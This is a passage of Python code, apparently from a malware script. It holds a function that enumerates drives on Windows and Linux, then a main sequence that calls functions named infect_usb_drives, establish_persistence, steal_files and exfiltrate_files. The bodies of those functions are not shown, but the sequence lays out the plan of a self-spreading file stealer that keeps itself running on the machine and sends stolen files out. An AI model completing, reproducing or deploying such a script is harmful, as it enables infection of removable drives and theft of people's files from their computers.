        drives = []
        if platform.system() == 'Windows':
            drives = [f'{chr(i)}:\\' for i in range(67, 91) if os.path.exists(f'{chr(i)}:\\')]
        elif platform.system() == 'Linux':
            output = subprocess.check_output(['lsblk', '-o', 'MOUNTPOINT']).decode().split('\n')[1:]
            drives = [d.strip() for d in output if d]
        return drives
    
    # Execute the steps
    infect_usb_drives()
    establish_persistence()
    steal_files()
    exfiltrate_files()

